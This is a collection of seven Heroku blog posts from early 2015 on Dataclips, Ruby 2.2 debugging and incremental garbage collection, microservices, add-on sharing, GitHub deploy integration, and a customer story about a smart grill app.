{"website": "Heroku", "title": "Share your Heroku Postgres data with the new Dataclips", "author": ["Peter van Hardenberg"], "link": "https://blog.heroku.com/new-dataclips", "abstract": "Share your Heroku Postgres data with the new Dataclips Posted by Peter van Hardenberg January 13, 2015 Listen to this article The most successful teams use their data to make the best decisions. We built Dataclips to allow your team to better share, reason about, and ask questions of the data you keep in Heroku Postgres. Heroku Dataclips are a lightweight data sharing tool that lets you take advantage of your organization’s most valuable asset. Dataclips were inspired by a set of collaboration tools we love like Google Docs and GitHub’s gists. We use tools like these every day to share everything from drafts of blog posts to snippets of code. The problem was that when we used them to share data it became stale the moment we hit the \"paste\" button. Even worse, when we’d go back to refresh that data often the queries that created it had been lost. Everyone in every role in every organization I’ve ever met has experienced this problem, and  that’s why we’re delighted to announce that today the new version of Heroku Dataclips is generally available. What is a Dataclip? A Dataclip is a secret URL that holds the results of a SQL query on a particular Heroku Postgres database. Given the unique, private URL for a query, a user can call up the most recently stored results of that query. Our system will automatically re-run the Dataclip from time to time in order to keep results fresh. By sharing a Dataclip URL the same way you would share the underlying data, any recipient can view that data within, download it as a CSV, or even embed it live into a tool like Google Sheets. \"As someone proficient in SQL, but not a programmer, they enabled me to do so much. I've created a suite of reporting tools for the entire company in google docs. It has saved our engineers countless hours of work\" — Evan Maridou, Tuft & Needle Productivity We absolutely love seeing how our users have adopted Dataclips, and the work we’ve done on the redesign we’re launching today is the product of feedback from a great many users. We’ve introduced all kinds of polish, including full page editing, full page results, and the ability to toggle between horizontal and vertical listings. We’ve also focused on performance, because fast is a feature everyone can appreciate, and added a new look that matches the beautiful Heroku Dashboard design that was released in August . Discovery We’ve observed that data literacy is a hallmark of healthy organizations. That’s why more than just sharing the results, Dataclips is a tool for helping a team learn how to ask the right questions. When a member of a team can use data to drive a decision, they make better choices. In addition to sharing Dataclip URLs within your team, the Dataclips home page will let you browse the Dataclips associated with databases you have access to. It includes a blazingly fast search that works no matter whether you remember a word from the title of the clip or the creator of it, and it continues to perform whether you have five clips or five hundred. Exploring Every Dataclip includes the query that produced the clip as well as its results. This means that anyone on the team can look at the query and let it inspire their own questions. This led us to add the ability to \"fork\" a Dataclip as well as editing it in place. A fork of a Dataclip copies the clip to a new URL where it can be edited to find new results and shared again. By starting with queries written by more experienced authors (and by using features like Postgres’ WITH expressions to write readable queries) the ability to not just retrieve but also to explore data spreads through a team. Security As with gists, the primary way to reach a Dataclip is through its URL, and you should treat the URL as being equivalent to the data inside it. However, we know that some data is more sensitive than others, and that’s why we’ve also included security tools that allow you to restrict access and define exactly which users are allowed to access that Dataclip. In Conclusion Data sitting quietly in a database doesn’t do any good for anyone. That’s why we added Dataclips into every Heroku Postgres database and rebuilt Dataclips based on your feedback to be faster, easier to use, and better integrated with the Heroku dashboard. The most important data your team has can be at your fingertips at all times by adopting Dataclips today. No matter whether you’re tracking sign-ups, in-app behaviour, revenue, or all three you can use Dataclips to keep a live view into the performance of your application. Why not make a Dataclip right now? postgres dataclips", "date": "2015-01-13,"},
{"website": "Heroku", "title": "Debugging Super Methods with Ruby 2.2", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/debugging-support-methods-ruby22", "abstract": "Debugging Super Methods with Ruby 2.2 Posted by Richard Schneeman January 13, 2015 Listen to this article Debugging a large codebase is hard. Ruby makes debugging easier by exposing method metadata and caller stack inside Ruby's own process. Recently in Ruby 2.2.0 this meta inspection got another useful feature by exposing super method metadata . In this post we will look at how this information can be used to debug and why it needed to be added. One of the first talks I ever wrote was \"Dissecting Ruby With Ruby\" all about inspecting and debugging Ruby processes using nothing but Ruby code. If you've never heard of the Method  method it's worth a watch. In short, Ruby knows how to execute your code, as well as where your code was defined. For example, with this small class: class Dog\n  def bark\n    puts \"woof\"\n  end\nend We can see exactly where Dog#bark is defined: puts Dog.new.bark\n# => \"woof\"\nputs Dog.new.method(:bark).source_location.inspect\n# => [\"/tmp/dog.rb\", 2] Even if someone did some crazy metaprogramming or you accidentally over-wrote the method, Ruby will always tell you the location of the method it will call. Super problems If you've seen the \"Dissecting Ruby\" talk , you'll know that there is a big problem with the super method. It's almost impossible to tell where the final method location being called is written. class SchneemsDog < Dog\n  def bark\n    super\n  end\nend I ended up using some metaprogramming to figure this out: cinco = SchneemsDog.new\ncinco.class.superclass.instance_method(:bark)\n# => [\"/tmp/dog.rb\", 6] This works, but it wouldn't if we did certain types of metaprogramming. For example, we would get the wrong answer if we did this: module DoubleBark\n  def bark\n    super\n    super\n  end\nend\ncinco = SchneemsDog.new\ncinco.extend(Doublebark) In this case, cinco.bark will call the method defined in the Doublebark module: cinco.bark\n# => bark\n# => bark\n\nputs cinco.method(:bark)\n#<Method: SchneemsDog(DoubleBark)#bark> The actual \"super\" being referred to is defined in the SchneemsDog class. However, the code tells us that the method is in the Dog class, which is incorrect. puts cinco.class.superclass.instance_method(:bark)\n# => #<UnboundMethod: Dog#bark> This is because our Doublebark module isn't an ancestor of the cinco.class . How can we solve this issue? Super solutions In feature request #9781 , I proposed adding a method to allow Ruby to give you this information directly. Shortly after, one of my co-workers, Nobuyoshi Nakada , A.K.A. \"The Patch Monster\", attached a working patch, and it was accepted into the Ruby trunk (soon to become 2.2.0) around July. If you are debugging in Ruby 2.2.0 you can now use Method#super_method . Using the same code we mentioned previously: cinco = SchneemsDog.new\ncinco.method(:bark).super_method\n# => #<Method: Dog#bark> You can see this returns the method on the Dog class rather than the SchneemsDog class. If we call source_location in the output, we will get the correct value: module DoubleBark\n  def bark\n    super\n    super\n  end\nend\ncinco = SchneemsDog.new\ncinco.extend(Doublebark)\n\nputs cinco.method(:bark)\n# => #<Method: SchneemsDog(DoubleBark)#bark>\nputs cinco.method(:bark).super_method\n# => #<Method: SchneemsDog#bark> Not only is this simpler, it's now correct. The return of super_method will be the same method that Ruby will call when super is invoked, regardless of whatever craziness is done with metaprogramming. Even though this is a simple example, I hope you'll find this useful in the wild. Follow @schneems for Ruby articles and pictures of his dogs. Note that Cinco was not harmed in the making of this blog post ruby debug", "date": "2015-01-13,"},
{"website": "Heroku", "title": "Why Microservices Matter", "author": ["Hunter Loftis"], "link": "https://blog.heroku.com/why_microservices_matter", "abstract": "Why Microservices Matter Posted by Hunter Loftis January 20, 2015 Listen to this article All successful applications grow more complex over time, and that complexity creates challenges in development. There are two essential strategies to manage this problem: a team can keep everything together (create a monolith) or a team can divide a project into smaller pieces (create microservices). The monolith at its most extreme is a single code base that contains all of an application’s logic and to which all programmers involved contribute. This approach is perhaps the most natural, and organic growth often tends towards this model. It’s also, in many ways, the easiest to reason about and operate. A single codebase can reduce many of the costs involved in distributed systems. Unfortunately, the practical costs of deploying a very large project can reduce velocity over time and can make it difficult for larger teams to collaborate. Microservices, on the other hand, describe a strategy for decomposing a large project into smaller, more manageable pieces. Although decomposing big projects into smaller pieces is a practice we’ve seen in the field for as long as software has been written, the recent microservices movement captures a number of best practices and hypotheses about how to scale software development. Microservices encapsulate many of the best practices of some of the industry’s biggest software development organizations, and are at the core of the development practice of many organizations today, not least among them Heroku, Netflix, or Amazon. It’s worth noting that there is no such thing as a free lunch, and the advantages of microservice based development bring new challenges as well. Microservices Concepts Put simply, a microservice is a piece of application functionality factored out into its own code base, speaking to other microservices over a standard protocol. To accomplish this, first divide your business requirements into related groups like account management logic, advertising logic, and a web user interface. Write a program to provide each service - thus the name - and connect each service to a language-agnostic protocol like HTTP, AMQP, or Redis. Finally, pass messages via the protocol to exchange data with other services. This approach maps exceptionally well to the way people use software today. Gone are the days of single programs dominating workflows, or even single devices. Instead, ephemeral APIs provide a flow of data to users through phones, tablets, laptops, wearables, automobiles, and other interfacing hardware. Blog posts, reviews, or even tweets can drastically alter the shape of requests to an organization - but users expect always-reliable, always-fast responses. Microservices can be distributed globally for low latency and can even run multiple versions of the same service simultaneously for redundancy. And, since services are organized by business function rather than compelled by code structure, embracing the technology and interfaces of the future becomes a much less frightening proposition. However, microservices aren’t a silver bullet, and they won’t make a sluggish IT organization fast. While individual services become more robust and less complex, the overall system takes on the many challenges of distributed systems at the network level. Despite their challenges, they’re here to stay because they map better than anything else to the software landscape of the future: parallel development, platform-as-a-service deployment, and ubiquitous use. What’s Driving this Trend? The first force that led to the surge in microservices was a reaction against traditional, monolithic architecture. While a monolithic app is One Big Program with many responsibilities, microservice-based apps are composed of several small programs, each with a single responsibility. This allows teams of engineers to work relatively independently on different services. The inherent decoupling also encourages smaller, simpler programs that are easier to understand, so new developers can start contributing more quickly. Finally, since no single program represents the whole of the application, services can change direction without massive costs. If new technology becomes available that makes more sense for a particular service, it’s feasible to rewrite just that service. Similarly, since microservices communicate across a language-agnostic protocol, an application can be composed of several different platforms - Java, PHP, Ruby, Node, Go, Erlang, etc - without issue. Of course, software is useless until deployed. As you might imagine, deploying dozens of small services incurs a much greater overhead than shipping a single codebase. Each service requires supporting technologies like load balancing, discovery, and process monitoring - the same type of support you would set up just once for a monolith. This grows even more complex to take advantage of another opportunity in microservices: independently scaling different types of work. Since each service will require a different combination of processing, memory, and I/O to operate at maximum efficiency, they should be housed in different types of containers. Similarly, as workloads change, the scale of each type of service should be able to grow and shrink to adapt to user demand. While this results in incredible levels of flexibility, responsiveness, and efficiency, it also comes with a huge operational cost in terms of IT support. This led to the second force precipitating microservices: the availability of reliable Platform-as-a-Service providers. Fundamentally, a PaaS provides you with a container, an abstraction in which you house your software. All of the supporting technologies discussed above, from load balancing to independent scaling and process monitoring, are provided by the platform, outside of your container. Without such providers, deploying even a single monolithic app can take whole teams of IT operations specialists. However, with a PaaS, the range of people qualified to deploy applications grows to include generalists like application developers or even project managers, reducing deployment effort to near-zero. For instance some of our customers have no one devoted full-time to IT operations, and can deploy to countries all over the world made by any developer on the team. With the advent of PaaS, microservice deployment has become a reasonable endeavor. What All This Means to You You should definitely consider a microservice strategy as part how you scale your projects over time, but you should be mindful of the operational challenges inherent in running multiple codebases. Dividing your project into components running in their own environment will help you to enforce a separation of responsibility in healthy ways, make it easier to onboard new developers, enable you to choose different languages and technologies for different components, and can help prevent a problem in one part of your code from bringing down the whole system. That said, microservices are not a free lunch. Each service has its own overhead, and though that cost is reduced by an order of magnitude by running in a PaaS environment, you still need to configure monitoring and alerting and similar services for each microservice. Microservices also make testing and releases easier for individual components, but incur a cost at the system integration level. Plan for how will your system behave if one of the services goes offline. Don’t start by splitting your code up too finely. Each division point becomes an API your team will need to support over time. At Heroku, we tend to have slightly fewer services than the number of developers on a project. Separating mobile and web clients from their APIs is a very sensible place to start. Over time, decompose projects further when they become unwieldy. Overall, though, a considered strategy of decomposing your application into smaller pieces will allow you to make better technology choices, give your team more velocity, and can give you more ways to maintain availability. Learn More If you’d like to learn more about how your organization can take advantage of microservices on Heroku take a look at this Nodevember talk on 'Production-Ready Node Architecture' http://bit.ly/1yF6vJt and Fred George's NodeConf EU talk on 'Microservice Challenges' http://bit.ly/1EnKHEc microservices", "date": "2015-01-20,"},
{"website": "Heroku", "title": "Expanding the Power of Add-ons", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/expanding_the_power_of_add_ons", "abstract": "Expanding the Power of Add-ons Posted by Craig Kerstiens January 23, 2015 Listen to this article In a world where microservices continue to grow , offering better agility for iterating quickly, many of the tools you use in building applications must adapt. Microservices bring together challenges in a variety of ways for the services you consume – logging and monitoring tools now need a broader perspective than that of a single app, data services may be shared either for reporting or direct access to data. Heroku has been on the forefront of creating a developer tools add-ons ecosystem that lets you focus on building your app by grabbing the service you need off the shelf. Today, the Heroku platform is becoming even more powerful with add-on sharing – a new feature for composing applications that allows multiple apps to share add-ons and add-ons to bridge multiple apps. This new iteration of our add-ons API provides several key improvements, making working with the add-ons you already know and love even better. These include: Share your add-ons: Ability to attach your add-ons across multiple apps owned by the same account Have multiple add-on instances on your app: Ability to have multiple add-ons from a single provider on an app Improve add-on visibility: Create unique names for your add-ons, making it easier to  share and communicate to your team about your add-ons. Let’s take a quick drive of how you’ll experience this new functionality. First let’s create our add-on: $ heroku addons:create heroku-postgresql --name my-sushi-db -a my-sushi-app\n Creating my-sushi-db... done\n Adding my-sushi-db to my-sushi-app... done\n Setting DATABASE_URL, HEROKU_POSTGRESQL_JADE_URL and restarting my-sushi-app... done, v4\n Use `heroku addons:docs heroku-postgresql` to view documentation. Now that we have this new database on my-sushi-app we can reference it two ways, via DATABASE_URL and HEROKU_POSTGRESQL_JADE_URL . But we can also add the my-sushi-db database to another app, and for better clarity we can name it as well: $ heroku addons:attach my-sushi-db -a my-sushi-reporting --as MAIN_SUSHI_DB\n Adding MAIN_SUSHI_DB to my-sushi-reporting... done\n Setting MAIN_SUSHI_DB vars and restarting my-sushi-app-reporting... done, v3 An important item to note is that with this powerful change to how you’re able to work with add-ons, we’ve made modifications to the commands used to work with add-ons. The create command is now used to create your add-on and the attach command is for sharing it across apps; in the future we’ll be working to deprecate the addons:add command in favor of this new nomenclature Now that you’ve gotten a high-level picture of what this means to you, let’s dig in a little more on the specifics of what add-on sharing enables for you. Sharing your add-ons When Rails emerged it allowed faster development and richer applications. It helped popularize the MVC approach to building applications, which made decomposing your app into smaller pieces possible. Since then, we’ve seen a trend toward further decomposing apps into smaller microservices, allowing teams and companies to move even faster. Though as microservices grow you have other trade-offs – namely getting visibility across your entire application. Let’s dig deeper into one example of how add-on sharing gives you this visibility back. One of our most popular add-ons New Relic provides performance monitoring for your application. As your app becomes decomposed you have may have previously had multiple instances of New Relic running attempting to correlate across them. With add-on sharing you’ll be able to simply share your core instance of New Relic to all the other smaller apps and get both a broad but detailed picture into where your performance bottlenecks are. Here’s what Bill Lapcevic, VP of Customer Success at New Relic, had to say about the new add-on sharing – \"New Relic has been an add-on partner from the early days when Heroku pioneered the developer tools ecosystem. We’re excited to be among the first add-on providers to have access to Add-on Sharing, a powerful feature that allows developers to monitor multiple Heroku apps, giving them unprecedented visibility into their environments.\" Multiple add-on instances on your app When it comes to the services backing your application while you care about all of them, often you don't care about all of them equally. A great example of this is the multiple use cases that exist for Redis. The two use cases we see very often for developers on Heroku are queueing and caching. When asked which they care more about, we hear a resounding answer of queueing. As an architectural pattern what we see is companies pick what they feel is the most reliable Redis provider and plan for their queue, and are often more flexible on which provider and plan they use for their cache. With the changes announced today,  you’ll be able to choose a single provider based on the same factors and simply choose different plans to suit your needs. Visibility Having a unified view of everywhere your service configs are set gives you back the safety you need while still letting you decompose your app into smaller services. As highlighted within the 12 factor app , storing your config in the environment is a great practice, but in a production environment you less often need those raw values but rather a reference to it. With underlying updates to easily give you an unique reference to your add-ons, we provide greater visibility to everywhere. Let’s take a quick look at the references of dozing-idly-4940 (the database we added above): heroku addons\n === Add-on Attachments\n my-sushi-app        DATABASE                    @dozing-idly-4940\n my-sushi-reporting  MY_SUSHI_APP_MAIN_DATABASE  @dozing-idly-4940\n my-sushi-app        HEROKU_POSTGRESQL_JADE      @dozing-idly-4940 Getting started We’re excited for this iteration of add-ons to provide even more power and flexibility in the apps you build. As our other add-on providers enable this support you’ll automatically be able to take advantage of multiple instances of an add-on, and as well as sharing your add-ons across your applications.", "date": "2015-01-23,"},
{"website": "Heroku", "title": "Incremental Garbage Collection in Ruby 2.2", "author": ["Koichi Sasada"], "link": "https://blog.heroku.com/incremental-gc", "abstract": "Incremental Garbage Collection in Ruby 2.2 Posted by Koichi Sasada February 03, 2015 Listen to this article This article introduces incremental garbage collection (GC) which has been introduced in Ruby 2.2. We call this algorithm RincGC. RincGC achieves short GC pause times compared to Ruby 2.1. About the Author: Koichi Sasada works for Heroku along with Nobu and Matz on C Ruby core. Previously he wrote YARV Ruby's virtual machine, and he introduced generational GC (RgenGC) to Ruby 2.1. Koichi wrote incremental GC for Ruby 2.2 and authored this paper. Background Ruby uses GC to collect unused objects automatically. Thanks to GC, Ruby programmers do not need to release objects manually, and do not need to worry about bugs from object releasing. The first version of Ruby already has a GC using mark and sweep (M&S) algorithm. M&S is one of the most simple GC algorithms which consists of two phases: (1) Mark: traverse all living objects and mark as \"living object\".\n(2) Sweep: garbage collect unmarked objects as they are unused. M&S is based on the premise that traversable objects from living\nobjects are living objects. The M&S algorithm is simple and it works well. Fig: Mark & sweep GC algorithm This simple and effective algorithm (and a conservative GC technique) allows C-extension writers to write extensions easily. As a result, Ruby gained many useful extension libraries. However, because of this GC algorithm, it is difficult to employ moving GC algorithms such as compaction and copying . Today, writing C-extension libraries is not as important because we can use FFI (foreign function interface). However, in the beginning, having many extension libraries and providing many features through C-extensions was a big advantage and made the Ruby interpreter more popular. While M&S algorithm is simple and works well, there are several problems. The most important concerns are \"throughput\" and \"pause time\". GC slows down your Ruby program because of GC overhead. In other words, low throughput increases total execution time of your application. Each GC stops your Ruby application. Long pause time affects UI/UX on\ninteractive web applications. Ruby 2.1 introduced generational garbage collection to\novercome \"throughput\" issue. Generational GC divides a heap space into several spaces for several generations (in Ruby's case, we divide heap\nspace into two: one \"young\" and one \"old\" space). Newly created objects are\nlocated in the young space and labeled as \"young object\". After surviving several GCs (3 for Ruby 2.2), young objects will be promoted to \"old objects\" and located in the \"old space\". In object oriented programming, we know that most objects die young. Because of this we only need\nto run GC on the “young space”. If there is not enough space in the young space to create new objects, then we run GC on the “old space”. We call \"Minor GC\" when GC runs only in the young space. We call \"Major GC\"\nfor GC that runs in both young and old spaces. We implemented generational GC algorithm with some customization and we call our GC algorithm and implementation as \"RGenGC\". You can watch more about RGenGC at my talk at EuRuKo and slides . RGenGC improves GC throughput dramatically because minor GC is very fast. However, major GC must pause for a long time and is equivalent to pause time in Ruby 2.0 and earlier. Most of GC are minor GC, but a few major GC may stop your ruby application for a long time. Fig: Major GC and minor GC pause time To solve long pause time issue, incremental GC algorithm is a well known GC algorithm to solve it. Basic idea of incremental garbage collection Incremental GC algorithm splits a GC execution process into several fine-grained processes and interleaves GC processes and Ruby processes. Instead of one long pause, incremental garbage collection will issue many shorter pauses over a period of time. The total pause time is the same (or a bit longer because of overhead to use incremental GC), but each individual pause is much shorter. This allows the performance to be much more consistent. Ruby 1.9.3 introduced a \"lazy sweep\" GC which reduces pause time in the\nsweeping phase. The idea of lazy sweep is to run sweeping phase not at once,\nbut step by step. Lazy sweep reduces individual sweep pause times and  is half of the incremental GC algorithm. Now, we need to\nmake major GC marking phase incrementally. Let us introduce three terminology to explain incremental marking:\n\"white object\" which is not marked objects\n \"grey object\" which is marked, but it may have a reference to white objects\n\"black object\" which is marked, but does not point any white object. With these three colors, we can explain mark and sweep algorithm like that: (1) All existing objects are marked as white\n(2) Clearly living objects such as objects on the stack marked Grey.\n(3) Pick one grey object, visit each object it references and color it grey. Change the color of the original object to black. Repeat until there are no grey objects left only black and white.\n(4) Collect white objects because all living objects are colored black. To make this process incremental, we must make step (3) incremental. To do this, pick some grey objects and mark the objects they reference grey, and back to Ruby execution, and continue incremental marking phase, again and again. Fig: normal marking (STW: stop the world) vs. incremental marking There is one problem to incremental marking. Black objects can refer white objects while Ruby executes. This is a problem since the definition of the \"black object\" states that it has no reference to white objects. To prevent such case, we need to use \"write-barrier\" to detect a creation of such reference from \"black object\" to \"white object\". For example, an array object ary is already marked \"black\". ary = []\n# GC runs, it is marked black Now an object obj = Object.new is white, if we run this code ary << obj\n# GC has not run since obj got created Now a black object has a reference to a white object. If no grey objects refer to obj , then obj will be white at the end of marking phase and reclaimed by\nmistake. Collecting living objects is a critical bug, we need to\navoid such blunders. A write-barrier is invoked every time an object obtains a new reference to a new object. The write-barrier detects when a reference from a black object to a white object is made. When this happens the black object is changed to grey (or grey destination white object). Write barriers solve this type of catastrophic GC bug completely. This is basic idea of the incremental GC algorithm. As you see, it is\nnot so difficult. Maybe you have question: \"why does Ruby not use this\nsimple GC algorithm yet?\". Incremental GC on Ruby 2.2 There is one big issue to implement incremental marking in the Ruby interpreter\n(CRuby): the lack of write barriers. CRuby does not have enough write\nbarriers. Generational GC which was implemented in 2.1 also needs write barriers. To\nintroduce generational GC, we invented new technique called \"write\nbarrier unprotected objects\". It means that we divide all objects into\n\"write barrier protected objects\" (protected objects) and \"write barrier\nunprotected objects\" (unprotected objects). We can guarantee that all\nreferences from protected objects are managed. We can not control\nreferences from unprotected objects. Introducing \"unprotected object\",\nwe can implement a generational GC for Ruby 2.1. Using unprotected objects, we can also make incremental GC properly: (1) Color all existing objects white.\n(2) Color clearly living objects grey, this includes objects on the stack.\n(3) Pick one grey object, visit each object it references and color it grey. Change the color of the original object to black. Repeat until there are no grey objects left only black and white. This step is done incrementally.\n(4) Black unprotected objects can point white objects, so scan all objects from unprotected black objects at once.\n(5) Collect white objects because all living objects are colored black. By introducing step (4), we can guarantee that there are\nno living white objects. Fig: Rescan from write barrier unprotected (WB unp.) objects at the\nend of marking. Unfortunately step (4) can introduce long pause times that we hoped to avoid.\nHowever, the pause time is relative to the number of living write\nbarrier unprotected objects. In Ruby language, most of objects are\nString, Array, Hash, or pure Ruby user defined objects. They are already write barrier protected objects. So long pause time for write barrier unprotected objects does not cause any problem in most practical cases. We introduced incremental marking for only major GC because nobody complains about pause time of minor GC. Maximum pause time on our incremental GC is shorter than minor GC pause time. If you have no problem on minor GC pause time, you don't need to worry about this major\nGC pause time. I also introduced a trick to implement incremental GC for Ruby. We get a set of \"black and unprotected\" objects. To get such fast GC, we prepare an \"unprotected\" bitmap which represents which objects are unprotected objects and a separate \"marked\" bitmap\nwhich represents which objects are marked. We can get \"black and unprotected\" objects using logical product with two bitmaps. Evaluation of incremental GC pause time To measure pause times caused by GCs, let's use gc_tracer gem . gc_tracer gem introduces the GC::Tracer module to capture GC related parameters at each GC events. The gc_tracer gem puts each parameters on to the file. GC events consists of the following events: start end_mark end_sweep newobj freeobj enter exit As I described above, Ruby's GC has two phases: \"marking phase\" and \"sweeping phase\". \"start\" event shows \"starting marking phase\" and \"end_mark\" event means \"end of marking phase\". \"end_mark\" event also means \"starting sweeping phase\". Of course, \"end_sweep\" shows the end of \"sweeping phase\" and also means the end of one GC process. The \"newobj\" and \"freeobj\" is easy to understand: events at object allocation and object releasing. We use \"enter\" and \"exit\" events to measure pause time. Incremental GC (incremental marking and lazy sweeping) introduces pausing marking and sweeping phase. \"enter\" event means that:\n\"entering GC related event\". and \"exit\" event means that \"exitting GC related event\". The following figure shows the event timing for current incremental GC. GC events We can measure the current time (on Linux machines, current times are results of gettimeofday()) for each events. So that we can measure GC pause time using \"enter\" and \"exit\" events. I use ko1-test-app for our pause time benchmark. ko1-test-app is simple rails app written by one of the our hero \"Aaron Patterson\" for me. To use gc_tracer , I add a rake rule \"test_gc_tracer\" like that. diff --git a/perf.rake b/perf.rake\nindex f336e33..7f4f1bd 100644\n--- a/perf.rake\n+++ b/perf.rake\n@@ -54,7 +54,7 @@ def do_test_task app\n   body.close\n end\n\n-task :test do\n+def test_run\n   app = Ko1TestApp::Application.instance\n   app.app\n\n@@ -67,6 +67,22 @@ task :test do\n   }\n end\n\n+task :test do\n+  test_run\n+end\n+\n+task :test_gc_tracer do\n+  require 'gc_tracer'\n+  require 'pp'\n+  pp GC.stat\n+  file = \"log.#{Process.pid}\"\n+  GC::Tracer.start_logging(file, events: %i(enter exit), gc_stat: false) do\n+ test_run\n+  end\n+  pp GC.stat\n+  puts \"GC tracer log: #{file}\"\n+end\n+\n task :once do\n   app = Ko1TestApp::Application.instance\n   app.app And run bundle exec rake test_gc_tracer KO1TEST_CNT=30000 . The value \"30000\" specified that we will simulate 30,000 requests. We can get a results in a file \"log.xxxx\" (xxxx is the process id of application). The file should include like that: type  tick  major_by      gc_by   have_finalizer  immediate_sweep state\nenter   1419489706840147      0     newobj  0     0     sweeping\nexit  1419489706840157      0     newobj  0     0     sweeping\nenter   1419489706840184      0     newobj  0     0     sweeping\nexit  1419489706840195      0     newobj  0     0     sweeping\nenter   1419489706840306      0     newobj  0     0     sweeping\nexit  1419489706840313      0     newobj  0     0     sweeping\nenter   1419489706840612      0     newobj  0     0     sweeping\n... On my environment, there are 1,142,907 lines. \"type\" filed means events type and tick means current time (result of gettimeofday(), elapesd time from the epoc in microseconds). We can get GC pause time by this information. Using the first two lines above, we can measure a pause time 10 us (by 1419489706840157 - 1419489706840147). The following small script shows each pause times. enter_tick = 0\nopen(ARGV.shift){|f|\n  f.each_line{|line|\n  e, tick, * = line.split(/\\s/)\n  case e\n  when 'enter'\n    enter_tick = tick.to_i\n  when 'exit'\n    st = tick.to_i - enter_tick\n    puts st if st > 100 # over 100 us\n  else\n    # puts line\n  end\n  }\n} There are so many lines, so this script prints pause times over 100us. The following figure shows the result of this measurement. We can have 7 huge pause time in generational GC. They should be a pause time by major GC. The maximum pause time is about 15ms (15Kus). However, incremental GC reduces the maximum pause time (around 2ms (2Kus)). Great. Summary Ruby 2.2 introduces incremental GC algorithm to achieve shorter pause time due to GC. Note that incremental GC is not a silver bullet. As I described, incremental GC does not affect \"throughput\". It means that there is no effect for a response time if the request is too long and causes several major GC. Total time of GC is not reduced with incremental GC. Please try it on your application on Heroku. Enjoy your hacking! ruby garbage collection", "date": "2015-02-03,"},
{"website": "Heroku", "title": "Ship Code Faster: Announcing GitHub Integration GA", "author": ["Michael Friis"], "link": "https://blog.heroku.com/heroku_github_integration", "abstract": "Ship Code Faster: Announcing GitHub Integration GA Posted by Michael Friis February 06, 2015 Listen to this article Today we’re announcing the general availability of GitHub integration for Heroku. When enabled, GitHub pushes are deployed immediately to linked Heroku apps. This is a big step forward for people working on apps with source managed on GitHub and deployed to Heroku. The integration has been in beta in Heroku Dashboard for a while, and we’ve seen great adoption and positive feedback. When a GitHub repo is connected to a Heroku app, you can either manually deploy branches from the repo, or you can configure a particular branch to auto-deploy to the app on every GitHub push. With auto-deploys enabled, you no longer have to maintain a separate heroku Git remote: Simply push to GitHub and changes are automatically deployed on Heroku. Configuring GitHub integration To connect a Heroku app with a GitHub repo, go to the app’s “Deploy” tab on Heroku Dashboard and select the GitHub pane. If you haven’t connected your Heroku and GitHub accounts, you will be prompted to complete the GitHub OAuth flow. Heroku needs access to help you select repos and to be able to register webhooks triggered when you push to GitHub. Once connected, you can select which repo associated with your GitHub account to link to the Heroku app. With app and repo connected, you can either manually deploy a specific branch, or select a Git branch that will be auto-deployed whenever it’s pushed to on GitHub. For auto-deploys, you can optionally configure Heroku to wait for continuous integration (like Travis CI) to pass on GitHub. With that option enabled, Heroku will only auto-deploy after all GitHub statuses for that commit have succeeded. Any builds created by the GitHub integration can be tracked in the app’s “Activity” tab and build output for running builds is streamed in Dashboard. Recommended setup Unless your testing and CI is very reliable, we recommend that you only auto-deploy to a staging app. You can use the Pipelines labs feature to promote changes from staging to production, or you can alternatively also link your production app to GitHub and trigger manual deploys to production once you’ve confirmed that a commit is good. If an issue is encountered during a Heroku deployment, be it manual or automatic, you can always rollback to the last known good release from either the CLI or in Dashboard. We’re excited about this integration because we know that GitHub is an important part of many of our users’ workflow. With GitHub integration for Heroku, we’re making the process of shipping code on GitHub to Heroku much simpler.", "date": "2015-02-06,"},
{"website": "Heroku", "title": "Ethos Solutions and Heroku: Building the Internet of GRILLED Things", "author": ["Katie Boysen"], "link": "https://blog.heroku.com/heroku_partner_solution_q_a_ethos_solutions", "abstract": "Ethos Solutions and Heroku: Building the Internet of GRILLED Things Posted by Katie Boysen February 11, 2015 Listen to this article At Heroku, we love telling the stories of what our customers and partners build on the platform. We love it even more when we get a chance to talk to the development team behind a successful app. So we were excited to sit down with Steve Simpson, CTO of Ethos Solutions—a Heroku partner —to discuss how his team built the award-winning app and intelligence behind the Lynx SmartGrill . Congratulations on your success working with Lynx on the SmartGrill project!  Can you tell me a little about the SmartGrill app and how it helps its users? The SmartGrill app is a native iOS and Android application that allows users to browse and cook recipes created specifically for their SmartGrill by professional Lynx chefs, participate in the community of Smart Grillers, plan out a meal,  and control almost all aspects of the cooking process in real time, right from their mobile device. How did Lynx and Ethos come to choose Heroku for the solution? With Lynx being a primarily Windows/.NET based  company, Microsoft Azure was the first choice when it came to choosing a cloud solution for providing an infrastructure hub between the SmartGrill app and grill. With time, it became apparent that Azure was not ready to meet the unique challenges posed by the SmartGrill project -- most importantly, the critical need for high availability, flexibility in scaling, as well as a low barrier to entry in introducing new features through add-ons and developer-friendly command line tools. After reviewing all the options, Heroku was the cloud services provider that met all of these requirements and even went beyond by offering solutions for challenges that we had not anticipated yet, such as easy deployment rollbacks and zero-downtime deployments. Lynx mentioned some flexibility features that other providers were not able to provide. What were some of the technical challenges to making this app a success? The two key needs while developing the SmartGrill app were the ability to quickly scale to meet demand and provide agility for developers when developing and deploying new features. In addition, a high level of availability and reliability was required as any system downtime  would greatly degrade the grilling experience. How was Heroku able to solve the technical challenges? Heroku was able to solve the technical challenges by providing a platform that can be rapidly scaled up or down as grilling activity changes. The busiest grilling times tend to be summer evening hours, so being able to handle the peak demand during these times while scaling back to reduce costs during off-hours with no down-time in between was key to the success of the project. The wealth of add-ons that Heroku provides ensured that many needs of the development team were already met with an existing add-on (for example, RabbitMQ servers for communication between the app and the grill, log monitoring, SQL backups, and so on). Advanced (yet easy-to-use) built-in features such as application forking and deployment rollbacks ensured that the development team could maintain a rapid pace of development and respond quickly to any issues that surfaced in the production environment. Can you share any of the details about how Heroku improves responsiveness and performance for the SmartGrill app? Heroku dynos and associated Postgres databases maintained a consistently higher level of performance compared to the comparable pricing tier on the previous cloud platform the infrastructure was built upon. In addition, Heroku makes horizontal scaling as easy as dragging a slider in a web Dashboard, which ensures that the operations team can easily scale resources as appropriate to meet increased demand. Anything else you want to tell us about the SmartGrill project? Through Heroku the development team was able to build and deploy the key parts of the SmartGrill application architecture in less than four weeks while maintaining costs at an acceptable level. Through the inherent scalability of the platform, the SmartGrill app is able to handle a large number of users at peak hours while ensuring that maintaining the application in the long-term is affordable. ** For more information on the Ethos and Lynx SmartGrill story, check out the Salesforce blog post .", "date": "2015-02-11,"},
